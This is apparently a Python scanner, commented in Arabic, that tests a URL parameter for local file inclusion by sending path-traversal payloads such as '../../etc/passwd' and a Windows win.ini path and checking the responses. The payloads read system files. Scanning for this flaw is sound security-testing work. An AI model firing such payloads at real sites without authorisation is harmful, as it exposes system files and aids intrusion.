import requests
from rich.console import Console
from urllib.parse import urljoin

console = Console()

def file_inclusion_bypass_scanner(url, payloads):
    """
    🔍 فحص طرق تجاوز حماية إدراج الملفات.

    Args:
        url (str): الرابط المستهدف الذي يحتوي على معلمة يمكن فحصها.
        payloads (list): قائمة بالـ payloads الشائعة لتجاوز الحماية.

    Example:
        file_inclusion_bypass_scanner(
            "http://example.com/page.php?file=",
            ["../../etc/passwd", "..\\..\\windows\\win.ini"]
        )
    """
    console.print(f"[cyan]🔍 بدء فحص إدراج الملفات في: {url}[/cyan]")

    vulnerable = False

    for payload in payloads:
        test_url = url + payload
        try:
            response = requests.get(test_url, timeout=5)

            if response.status_code == 200 and ("root:" in response.text or "[extensions]" in response.text):
                console.print(f"[red]❌ تم اكتشاف ثغرة إدراج الملفات في: {test_url}[/red]")
                vulnerable = True
            else:
                console.print(f"[green]✅ لم يتم الكشف عن ثغرة باستخدام: {payload}[/green]")
        except requests.RequestException as e:
            console.print(f"[yellow]⚠️ تعذر الوصول إلى: {test_url} | الخطأ: {e}[/yellow]")

    if not vulnerable:
        console.print("[green]🎉 الموقع يبدو آمناً من تجاوز إدراج الملفات![/green]")

